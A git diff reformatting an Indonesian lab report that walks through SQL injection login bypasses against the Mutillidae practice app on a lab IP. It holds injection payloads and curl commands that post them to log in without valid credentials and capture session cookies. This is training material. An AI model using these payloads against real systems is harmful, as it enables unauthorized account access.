@@ -20,7 +20,7 @@
    - Pilih Settings
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/network_tab.png "Home page")
 3. Connection Settings
-   - Gunakan manual proxy
+   - Gunakan **Manual proxy**
    - Pada kolom HTTP Proxy isikan **127.0.0.1**
    - Pada kolom Port **8080**
    - Centang bagian Use the proxy server for all protocols 
@@ -43,7 +43,7 @@
 
 ## SQL Injection: By-Pass Password Without Username (Obtain Access #1)
 1. Login Tanpa Menggunakan Password
-   - Pada kolom Textbox **Name** isikan **`' or 1=1 -- `**
+   - Pada kolom textbox **Name** isikan **`' or 1=1 -- `**
    - Pastikan anda menambahkan spasi setelah karakter **`--`**
    - Klik tombol Login
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/2/login_without_uname.png "Home page")
@@ -59,30 +59,28 @@
 ## Simulate CURL SQL Injection: (Obtain Access #1)
 1. Use Curl to Login with POST Data
    - Buka terminal, ketikkan perintah-perintah berikut : 
-```bash
-curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1+--+&password=&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login1.txt
-
-grep "Logged In" login1.txt
-
-cat crack_cookies.txt
-```
+   ```bash
+   curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1+--+&password=&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login1.txt
+   grep "Logged In" login1.txt
+   cat crack_cookies.txt
+   ```
    - Session cookies akan disimpan pada file crack_cookies.txt
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 
 ## SQL Injection: Single Quote Test On Password Field (Obtain Access #2)
 1. Inspect Password Box Element
    - Buka halaman Login/Register
-   - Pada kolom Textbox Name isikan samurai
-   - Pada kolom Textbox Password klik kanan, kemudian inspect element
+   - Pada kolom textbox Name isikan **samurai**
+   - Pada kolom textbox Password klik kanan, kemudian inspect element
 2. Edit Password Box Element
-   - Replace string password menjadi text
-   - Pada bagian size dan maxlength tambahkan kapasistasnya dari yg semula 20 menjadi 50
-![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/inspect_samurai.png "Home page")
+   - Replace string **password** menjadi **text**
+   - Pada bagian size dan maxlength tambahkan kapasistasnya dari yg semula **20** menjadi **50**
+   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/inspect_samurai.png "Home page")
 3. Berikan Kondisi Selalu True pada kolom Textbox Password
-   - Pada kolom Textbox Password isikan **`' or (1=1 and username='samurai')--`**
+   - Pada kolom textbox **Password** isikan **`' or (1=1 and username='samurai')--`**
    - Pastikan anda menambahkan spasi setelah karakter **`--`**
    - Klik tombol Login
-![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/samurai_with_pass.png "Home page")
+   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/samurai_with_pass.png "Home page")
 4. View Post Data (With Burp Suite)
    - Klik pada Tab Proxy Tab
    - Klik pada Tab History
@@ -95,29 +93,25 @@ cat crack_cookies.txt
    - Save file di dalam folder **root**
    - File Name: **burp2.txt**
    - Klik tombol Save
-![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/save_burp.png "Home page")
+   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/save_burp.png "Home page")
 6. View Post Data (With Burpsuite)
    - cd /root
    - Jalankan perintah berikut:
-```bash
-grep -i cookie burp2.txt
-
-grep -i username burp2.txt
-```
-![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/run_command.png "Home page")
+   ```bash
+   grep -i cookie burp2.txt
+   grep -i username burp2.txt
+   ```
+   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/run_command.png "Home page")
 
 Simulate cURL SQL Injection: (Obtain Access #2)
 1. Use Curl to Login with POST Data
    - Buka terminal, ketikkan perintah-perintah berikut : 
-```bash 
-rm crack_cookies.txt
-
-curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29+--+&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login2.txt
-
-grep "Logged In" login2.txt
-
-cat crack_cookies.txt
-```
+   ```bash 
+   rm crack_cookies.txt
+   curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29+--+&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login2.txt
+   grep "Logged In" login2.txt
+   cat crack_cookies.txt
+   ```
    - Session cookies akan disimpan pada file crack_cookies.txt
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/run_command_2.png "Home page")
 
